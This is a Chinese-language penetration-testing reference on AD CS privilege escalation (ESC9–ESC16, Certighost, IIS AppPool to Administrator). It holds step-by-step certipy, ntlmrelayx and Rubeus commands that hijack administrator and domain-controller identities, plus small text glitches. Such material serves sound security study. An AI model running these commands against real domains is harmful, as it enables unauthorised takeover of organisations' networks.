**`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) 是 **`msPKI-Enrollment-Flag`** 的一个值，称为 ESC9。它会从证书中省略 `szOID_NTDS_CA_SECURITY_EXT` SID 扩展。较早的 ESC9 示例依赖 KDC 兼容行为（`StrongCertificateBindingEnforcement=1`），或单独通过弱 Schannel 映射路径实现。值 `1` 是**历史兼容性设置**，并非当前默认值：Microsoft 表示，自 2025 年 9 月 9 日的 Windows 安全更新起，KDC 覆盖设置已停止受支持。应用旧方案前，请检查目标系统的实际更新情况和身份验证端点。<sup>[[7]](#references)</sup> 请参阅 [Microsoft 的推出指南](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)。

以下情况会影响此标志设置的重要性：

- 在较旧且兼容的 KDC 上，有效的证书绑定策略允许该映射；或者，Schannel 端点单独通过 `CertificateMappingMethods` 位 `0x4` 启用 UPN 映射。
- 证书的 `msPKI-Enrollment-Flag` 设置中包含 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。
- 证书指定了任意客户端身份验证 EKU。
- 对任意账户拥有 `GenericWrite` 权限，即可尝试攻陷其他账户。

### 滥用场景

假设 `John@corp.local` 对 `Jane@corp.local` 拥有 `GenericWrite` 权限，目标是攻陷 `Administrator@corp.local`。`Jane@corp.local` 有权注册的 `ESC9` 证书模板，其 `msPKI-Enrollment-Flag` 设置中配置了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。

首先，利用 `John` 的 `GenericWrite` 权限，通过 Shadow Credentials 获取 `Jane` 的哈希：

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

随后，`Jane` 的 `userPrincipalName` 被修改为 `Administrator`，特意省略 `@corp.local` 域部分：

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

此修改不违反约束，因为 `Administrator@corp.local` 仍然是 `Administrator` 的 `userPrincipalName`，两者彼此独立。

随后，以 `Jane` 的身份请求标记为易受攻击的 `ESC9` 证书模板：

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

请注意，证书的 `userPrincipalName` 显示为 `Administrator`，不包含任何“object SID”。

随后，`Jane` 的 `userPrincipalName` 被恢复为原值 `Jane@corp.local`：

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

现在使用颁发的证书尝试进行身份验证，即可获得 `Administrator@corp.local` 的 NT hash。由于证书未指定域，命令必须包含 `-domain <domain>`：

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## 弱证书映射 - ESC10

### 说明

ESC10 通常涉及两种独立的证书映射策略。请检查实际处理相关身份验证的端点上的设置：

- 应用程序服务器上的 Schannel `CertificateMappingMethods`（位于 `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel`）控制 TLS 客户端证书映射。UPN 位为 `0x4`；在已更新的系统上，默认值为 `0x18`（`0x8 | 0x10`）。
- KDC 上的 `StrongCertificateBindingEnforcement`（位于 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc`）过去用于控制 Kerberos 证书绑定兼容性。值 `1` 并非可靠的当前默认值，且 Microsoft 已在 2025 年 9 月 9 日的 Windows 安全更新中结束对该覆盖项的支持。仅凭其状态无法判断 Schannel 的 UPN 映射配置。<sup>[[7]](#references)</sup>

**情况 1**

过去，当旧版 KDC 遵循 `StrongCertificateBindingEnforcement=0` 时可能会出现这种情况；请核实更新级别，因为当前已打补丁的系统不再支持此覆盖项。

**情况 2**

当 Schannel 客户端证书端点启用了 `CertificateMappingMethods` 的 UPN 位（`0x4`）时。这是与 KDC 强绑定强制策略分开的设置，而且仍需要可申请的客户端身份验证证书，以及对映射账号属性的有效控制。

### 滥用场景 1

在 KDC 仍遵循 `StrongCertificateBindingEnforcement=0` 的旧版部署中，控制某个账号的 `userPrincipalName` 可以构成通往另一个账号的弱映射路径。必须分别核实所需的证书申请、映射、目标身份和身份验证是否成功；仅有 `GenericWrite` ACE 或注册表值并不能证明可以接管账号。

例如，攻击者拥有针对 `Jane@corp.local` 的 `GenericWrite` 权限，并试图攻陷 `Administrator@corp.local`。此过程与 ESC9 类似，可以使用任意证书模板。

首先，利用 `GenericWrite` 通过 Shadow Credentials 获取 `Jane` 的哈希。

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

随后，`Jane` 的 `userPrincipalName` 被更改为 `Administrator`，故意省略 `@corp.local` 部分，以避免违反约束。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

随后，以 `Jane` 的身份使用默认的 `User` 模板申请一个启用客户端身份验证的证书。

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane` 的 `userPrincipalName` 随后被恢复为原始值 `Jane@corp.local`。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

使用获取到的证书进行身份验证将获得 `Administrator@corp.local` 的 NT hash。由于证书中不包含域信息，因此必须在命令中指定域。

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### 滥用案例 2

当 `CertificateMappingMethods` 包含 `UPN` 位标志（`0x4`）时，具有 `GenericWrite` 权限的账户 A 可以攻陷任何没有 `userPrincipalName` 属性的账户 B，包括机器账户和内置域管理员 `Administrator`。

在此，目标是攻陷 `DC$@corp.local`，方法是利用 `GenericWrite`，通过 Shadow Credentials 获取 `Jane` 的哈希。

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

随后将 `Jane` 的 `userPrincipalName` 设置为 `DC$@corp.local`。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

使用默认的 `User` 模板，以 `Jane` 的身份申请客户端身份验证证书。

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`Jane` 的 `userPrincipalName` 在此过程后会恢复为原始值。

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

要通过 Schannel 进行身份验证，使用 Certipy 的 `-ldap-shell` 选项；显示的身份验证成功标识为 `u:CORP\DC$`。

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

通过 LDAP shell，`set_rbcd` 等命令可用于发起基于资源的约束委派（RBCD）攻击，可能导致域控制器失陷。

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

此漏洞也会影响任何缺少 `userPrincipalName` 或其值与 `sAMAccountName` 不匹配的用户帐户。默认的 `Administrator@corp.local` 是主要目标，因为它拥有较高的 LDAP 权限，且默认情况下没有 `userPrincipalName`。

## Relaying NTLM to ICPR - ESC11

### 说明

如果 CA Server 未配置 `IF_ENFORCEENCRYPTICERTREQUEST`，就可以通过 RPC 服务发起不使用签名的 NTLM relay 攻击。[参考链接](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

你可以使用 `certipy` 枚举 `Enforce Encryption for Requests` 是否已禁用；如果是，certipy 会显示 `ESC11` 漏洞。

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### 滥用场景

需要设置一个中继服务器：

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

注意：对于域控制器，必须在 DomainController 中指定 `-template`。

或者使用 [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) ：

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## 通过 Shell 访问 ADCS CA 并使用 YubiHSM - ESC12

### 说明

管理员可以将证书颁发机构配置为将其存储在外部设备上，例如“Yubico YubiHSM2”。

如果通过 USB 端口将 USB 设备连接到 CA 服务器，或者在 CA 服务器是虚拟机的情况下通过 USB 设备服务器连接，则 Key Storage Provider 需要身份验证密钥（有时称为“密码”），才能在 YubiHSM 中生成和使用密钥。

此密钥/密码以明文形式存储在注册表的 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` 下。

参考[这里](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)。<sup>[[11]](#references)</sup>

### 滥用场景

如果 CA 的私钥存储在物理 USB 设备上，并且你获得了 shell 访问权限，就可以恢复该密钥。

首先，你需要获取 CA 证书（这是公开的），然后：

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

最后，使用 certutil `-sign` 命令，利用 CA 证书及其私钥伪造一个任意证书。

## OID Group Link Abuse - ESC13

### 说明

`msPKI-Certificate-Policy` 属性允许将颁发策略添加到证书模板中。负责颁发策略的 `msPKI-Enterprise-Oid` 对象可以在 PKI OID 容器的 Configuration Naming Context（CN=OID,CN=Public Key Services,CN=Services）中发现。策略可以通过此对象的 `msDS-OIDToGroupLink` 属性链接到 AD 组，从而使系统能够将出示该证书的用户视为该组的成员。[此处的参考资料](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)。<sup>[[12]](#references)</sup>

换句话说，当用户有权限申请证书，且该证书链接到 OID 组时，用户便可继承该组的权限。

使用 [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) 查找 OIDToGroupLink：

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### 滥用场景

查找拥有相关权限的用户，可以使用 `certipy find` 或 `Certify.exe find /showAllPermissions`。

如果 `John` 拥有注册 `VulnerableTemplate` 的权限，该用户就可以继承 `VulnerableGroup` 组的权限。

他只需指定模板，就能获得具有 OIDToGroupLink 权限的证书。

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## 显式证书映射滥用 — ESC14

### 说明

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping 中的说明非常详尽。以下引用原文。<sup>[[14]](#references)</sup>

ESC14 涉及由“弱显式证书映射”引发的漏洞，主要源于 Active Directory 用户或计算机帐户上的 `altSecurityIdentities` 属性被滥用或配置不安全。此多值属性允许管理员手动将 X.509 证书关联到 AD 帐户，以用于身份验证。设置此属性后，这些显式映射可能会覆盖默认的证书映射逻辑；默认逻辑通常依赖证书 SAN 中的 UPN 或 DNS 名称，或 `szOID_NTDS_CA_SECURITY_EXT` 安全扩展中嵌入的 SID。

当 `altSecurityIdentities` 属性中用于标识证书的字符串值范围过宽、容易猜到、依赖非唯一证书字段，或使用容易伪造的证书组件时，就会产生“弱”映射。如果攻击者能够获取或制作属性与特权帐户的此类弱显式映射相匹配的证书，就可以使用该证书以该帐户身份进行身份验证和冒充该帐户。

可能较弱的 `altSecurityIdentities` 映射字符串示例包括：

- 仅按常见的 Subject Common Name (CN) 映射：例如 `X509:<S>CN=SomeUser`。攻击者或许能够从安全性较低的来源获取具有此 CN 的证书。
- 使用过于通用的 Issuer Distinguished Name (DN) 或 Subject DN，且没有使用特定序列号或 subject key identifier 等进一步限定条件：例如 `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 使用其他可预测模式或非加密标识符，而攻击者可能能够在其合法获取或伪造的证书中满足这些条件（例如，攻击者已攻陷 CA，或发现了类似 ESC1 的易受攻击模板）。

`altSecurityIdentities` 属性支持多种映射格式，例如：

- `X509:<I>IssuerDN<S>SubjectDN`（按完整 Issuer 和 Subject DN 映射）
- `X509:<SKI>SubjectKeyIdentifier`（按证书的 Subject Key Identifier 扩展值映射）
- `X509:<SR>SerialNumberBackedByIssuerDN`（按序列号映射，并隐式以 Issuer DN 限定）——这不是标准格式，通常格式为 `<I>IssuerDN<SR>SerialNumber`。
- `X509:<RFC822>EmailAddress`（按 SAN 中的 RFC822 名称映射，通常为电子邮件地址）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（按证书原始公钥的 SHA1 哈希映射——通常较强）

这些映射的安全性取决于映射中使用的标识符。Microsoft 将基于电子邮件或主题名称的映射（包括 `X509:<RFC822>`）归类为**弱映射**。在 Full Enforcement 模式下，没有强映射的证书会被拒绝；2025 年 9 月的 Windows 安全更新移除了恢复到 Compatibility 模式的选项。因此，单靠弱映射并不是目前可靠的冒充途径。在评估弱映射场景之前，请检查域控制器的实际补丁级别和证书映射行为。对 `altSecurityIdentities` 的写入权限是另一条独立线索：拥有适当受信任证书的攻击者，可能能够添加**强**显式映射，但这取决于有效权限和证书验证。请参阅 [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) 和 [ESC14 研究](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)。

证书身份验证失败也需要排查：即使证书本身仍然有效，目标帐户已禁用或密码已过期也可能导致登录失败。

### 滥用场景

ESC14 针对 Active Directory (AD) 中的**显式证书映射**，具体涉及 `altSecurityIdentities` 属性。如果设置了此属性（无论是有意配置还是配置错误），攻击者都可以通过出示与映射相匹配的证书来冒充帐户。

#### 场景 A：攻击者可以写入 `altSecurityIdentities`

 **前提条件**：攻击者对目标帐户的 `altSecurityIdentities` 属性具有写入权限，或具有在目标 AD 对象上授予此类权限的权限，具体包括以下任一权限：  
- 写入属性 `altSecurityIdentities`  
- 写入属性 `Public-Information`  
- 写入属性（全部）  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- 所有者*。
#### 场景 B：目标具有通过 X509RFC822（电子邮件）进行的弱映射

- **历史/条件性前提条件**：目标的 `altSecurityIdentities` 中存在弱 X509RFC822 映射，攻击者可以编辑某个申请者的 `mail` 属性，并且有合适的模板能够在客户端身份验证证书中包含该电子邮件，且不会与冲突的 SID 绑定。身份验证还要求环境仍接受弱映射；Full Enforcement 会拒绝只有弱映射的证书。仅能写入 `mail` 属性只是一个线索。
#### 场景 C：目标具有 X509IssuerSubject 映射

- **前提条件**：目标的 `altSecurityIdentities` 中存在弱 X509IssuerSubject 显式映射。攻击者可以设置受害主体的 `cn` 或 `dNSHostName` 属性，使其与目标 X509IssuerSubject 映射中的 subject 相匹配。然后，攻击者可以以受害者身份申请证书，并使用该证书以目标身份进行身份验证。
#### 场景 D：目标具有 X509SubjectOnly 映射

- **前提条件**：目标的 `altSecurityIdentities` 中存在弱 X509SubjectOnly 显式映射。攻击者可以设置受害主体的 `cn` 或 `dNSHostName` 属性，使其与目标 X509SubjectOnly 映射中的 subject 相匹配。然后，攻击者可以以受害者身份申请证书，并使用该证书以目标身份进行身份验证。
### 具体操作
#### 场景 A

申请证书模板 `Machine` 的证书.

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 保存并转换证书

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 使用证书进行身份验证

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

清理（可选）

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

对于各种攻击场景中的更具体攻击方法，请参阅：[adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)。<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 说明

[original ESC15 research](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) 说明了如何通过针对 V1 template 的请求提供 application policies，从而覆盖**未打补丁的签发 CA**上配置的 Extended Key Usage。<sup>[[15]](#references)</sup> 此外，候选 template 必须已发布、允许注册，并允许所需的 subject/request 属性，且没有阻止注册的审批或签名要求。仅有注册权限并不能证明可以利用此漏洞。使用 Certificate Request Agent 还可能需要合适的第二个 template 和注册代理限制；在声称该利用路径成立之前，请确认 CA 的补丁状态和证书签发结果。

### 利用

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) 提供了更详细的用法示例。<sup>[[14]](#references)</sup>


如果 CA 未打补丁，Certipy 的 `find` 命令可以帮助识别可能受 ESC15 影响的 V1 templates。

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### 场景 A：通过 Schannel 直接冒充

**步骤 1：请求证书，注入“Client Authentication” Application Policy 和目标 UPN。**攻击者 `attacker@corp.local` 使用“WebServer” V1 模板（允许由注册者提供 subject），以 `administrator@corp.local` 为目标。

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`：存在漏洞的 V1 模板，设置为“Enrollee supplies subject”。
- `-application-policies 'Client Authentication'`：将 OID `1.3.6.1.5.5.7.3.2` 注入 CSR 的 Application Policies 扩展中。
- `-upn 'administrator@corp.local'`：在 SAN 中设置 UPN 以进行冒充。

**步骤 2：使用获取的证书通过 Schannel (LDAPS) 进行身份验证。**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### 场景 B：通过滥用 Enrollment Agent 进行 PKINIT/Kerberos 冒充

**步骤 1：从 V1 模板请求证书（该模板启用了“Enrollee supplies subject”），并注入“Certificate Request Agent” Application Policy。** 此证书用于让攻击者（`attacker@corp.local`）成为 enrollment agent。此处未为攻击者自身身份指定 UPN，因为目标是获得 agent 权限。

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`：注入 OID `1.3.6.1.4.1.311.20.2.1`。

**步骤 2：使用“agent”证书代表目标特权用户申请证书。** 这一步类似 ESC3，使用步骤 1 中的证书作为 agent 证书。

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**步骤 3：使用“on-behalf-of”证书以特权用户身份进行身份验证。**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## CA 上全局禁用安全扩展-ESC16

### 说明

**ESC16（因缺少 szOID_NTDS_CA_SECURITY_EXT 扩展而导致的权限提升）**描述的是在 CA 范围内禁用 **szOID_NTDS_CA_SECURITY_EXT** SID 扩展。这是一个配置指标，并不能证明证书可以作为另一个帐户进行身份验证。要冒充其他帐户，还需要控制相关帐户属性或映射、可注册的客户端身份验证模板，以及实际域控制器或服务接受的证书映射路径。处于 Full Enforcement 模式的已修补 KDC 会拒绝没有 SID 扩展且没有其他强映射的证书；下面仅使用 UPN 的 Kerberos 流程适用于仍接受弱映射的旧版或兼容模式 KDC。请参阅 [Microsoft 关于证书映射和强制执行的指南](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)。

你还可以参阅这篇文章，进一步了解详细原理：https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### 利用

以下历史性的 UPN-only Kerberos 示例基于 [Certipy 的 ESC16 文档](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)。此方法要求 KDC 仍接受由此产生的弱映射；自 2025 年 9 月 9 日 Windows 安全更新后，`StrongCertificateBindingEnforcement=1` 已不再是受支持的覆盖设置。<sup>[[14]](#references)</sup>

要识别 Active Directory Certificate Services (AD CS) 环境是否容易受到 **ESC16** 攻击pjün

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**步骤 1：读取受害者账户的初始 UPN（可选 - 用于恢复）。  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**步骤 2：将受害者帐户的 UPN 更新为目标管理员的 `sAMAccountName`。  \n  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**步骤 3：（如有需要）获取“受害者”账户的凭据（例如，通过 Shadow Credentials）。**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**步骤 4：在配置了 ESC16 的 CA 上，以“受害者”用户身份，从该账户可以注册的客户端身份验证模板（例如“User”）申请证书。**CA 会从签发的证书中省略 SID 安全扩展，但仅凭这一点并不能建立可用的身份验证映射。设置 Kerberos 凭据缓存环境变量（shell 命令）：

```bash
export KRB5CCNAME=victim.ccache
```

然后请求证书：

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**步骤 5：还原“victim”账户的 UPN。**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**步骤 6：在接受此弱映射的旧版或兼容模式 KDC 上，以目标管理员身份进行身份验证。**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA 追踪回调身份替换 (Certighost / CVE-2026-54121)

### 说明

**Certighost** 滥用 **AD CS 注册追踪 / 回调路径**：CA 信任由请求者提供的请求属性，并据此解析应写入已签发证书的身份。公开 PoC 中，精心构造的请求包含：<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**：由攻击者控制、CA 将连接到的主机/IP
- **`rmd`**：要冒充的**目标域控制器 DNS 名称**

如果 CA 按此路径进行追踪，它会通过 **SMB/LSA (`445`)** 和 **LDAP (`389`)** 连接到攻击者。攻击者使用**真实的计算机帐户**（通常通过默认的 **`ms-DS-MachineAccountQuota`** 创建），使回调会话以有效的域主体身份进行身份验证，但恶意服务返回的却是**目标 DC** 的身份属性：

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

如果 CA **没有通过密码学方式将返回的身份绑定到已通过身份验证的回调主体**，它就可能为**域控制器**签发证书，即使会话实际是以攻击者控制的计算机帐户进行身份验证的。这使得该漏洞在概念上有别于 **Certifried**：攻击者不是改写 `dNSHostName` 等 AD 属性，而是**在 CA 回调解析期间替换身份数据**。<sup>[[2]](#references)</sup>

**有利的前置条件：**

- 低权限的**域凭据**
- 能够**创建或复用计算机帐户**
- CA 能够通过网络访问攻击者控制的 **`389` 和 `445` 端口**
- 存在易受攻击 / 未打补丁的 CA 请求路径（**2026 年 7 月 14 日**的 Microsoft 更新为 **`cdc`** 添加了 **DC 验证**，并增加了**解析后 SID 比较**）

随后可将生成的 **`.pfx`** 用于 **PKINIT**，生成 **`.ccache`**，并在公开的 PoC 流程中获取**目标 DC NT 哈希**，这通常足以导致**整个域被攻陷**。

### 滥用

公开 PoC 会自动执行整个攻击链：<sup>[[1]](#references)</sup>

1. 创建或复用由攻击者控制的**计算机帐户**。
2. 在 `389` 和 `445` 端口启动**恶意 LDAP 和 SMB/LSA 监听器**。
3. 提交包含攻击者控制的 **`cdc`** 和目标 **`rmd`** 属性的证书请求。
4. 让 CA 以受控计算机帐户身份向恶意监听器进行身份验证，同时在响应身份查询时返回**目标 DC** 的属性。
5. 获取由 CA 签名的 **DC 证书**，然后将其用于 **PKINIT**。

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

PoC 中有用的运行时标志：

- `--listener <ip>`：显式选择在 `cdc` 中公布的回调 IP
- `--computer-name <NAME$>`：复用现有机器账户，而不是创建新账户

**操作注意事项：**

- PoC 需要 **root** 权限，因为它要绑定 **特权端口** `389` 和 `445`。
- 利用成功后，会在本地写入 **DC `.pfx`** 和 **Kerberos `.ccache`**。
- 由于证书映射到 **域控制器账户**，后续操作可以包括 **基于证书的 Kerberos 身份验证**、**DCSync**，以及复用恢复的 **机器 NT hash**。<sup>[[2]](#references)</sup>

## IIS AppPool 机器账户注册并提权至同主机 Administrator

以 `ApplicationPoolIdentity` 运行的 IIS 池会使用其主机的**计算机账户**访问网络资源。因此，以 `IIS AppPool\<POOL>` 身份执行代码时，本地令牌仍是低权限，但可以提交 AD CS 请求，由 CA 将其验证为 `HOST$`；这是出站身份转换，而非令牌模拟或 Potato 式本地提权。<sup>[[19]](#references)[[20]](#references)</sup>

此攻击链需要已加入域的 IIS 主机、可通过 RPC 访问的 Enterprise CA、已发布且计算机具有注册权限的机器身份验证模板、PKINIT 支持，以及 KDC/SMB 网络可达。自定义池身份会改变出站主体，因此在假定身份为 `HOST$` 之前，先确认该池确实使用 `ApplicationPoolIdentity`。<sup>[[19]](#references)[[20]](#references)</sup>

### 攻击者控制密钥注册

在 IIS 服务器之外生成密钥对和 CSR，并保留私钥。从被攻陷的工作进程**仅提交 CSR**。[Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) 会实例化 `CertificateAuthority.Request`，设置 `CertificateTemplate:Machine`，调用 `ICertRequest::Submit`，并返回颁发的证书。使用 CA 配置字符串 `CAHOST\CA-NAME`；标准 `Machine` 模板会从 AD 构建主题，因此不需要请求者提供主题/SAN 数据。<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

将返回的证书与**对应的已保留私钥**结合使用。只有当 Windows 已能将证书与可访问的私钥关联时，`certutil -MergePFX machine_cert.cer machine_cert.pfx` 才能成功；如果是独立的 PEM 文件，则需显式创建 PKCS#12：<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

使用 PFX 进行 PKINIT，并将返回的计算机 TGT 保留为 base64，而不是立即注入：<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self 加同主机服务替换

S4U2Self 允许服务获取一张**发给自身**、包含另一用户授权数据的票据。持有计算机 TGT 后，Rubeus 可以为特权用户请求该票据，将返回的 KRB-CRED 中的服务名称改写为 CIFS，然后注入该票据。这是本地的“委派给自己”原语：不需要 S4U2Proxy 或 `msDS-AllowedToDelegateTo` 条目。<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

